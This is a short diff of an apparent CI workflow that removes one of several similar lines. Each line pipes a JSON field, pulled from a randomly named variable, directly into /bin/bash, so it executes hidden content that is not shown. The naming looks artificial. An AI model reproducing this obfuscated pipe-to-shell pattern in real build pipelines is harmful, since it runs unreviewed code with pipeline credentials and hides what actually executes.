@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$rqgs948" | jq -r .uib2277 | /bin/bash
           echo $zjc75 | jq -r .pnd91248 | /bin/bash
           echo $unks75 | jq -r .zau5 | /bin/bash
-          printf '%s' "$rk34825" | jq -r .ibrmw56516 | /bin/bash
           echo $r1628 | jq -r .bw6112 | /bin/bash
           printf '%s' "$c9" | jq -r .kw4049 | /bin/bash
           echo $el0175 | jq -r .zlsmy8 | /bin/bash
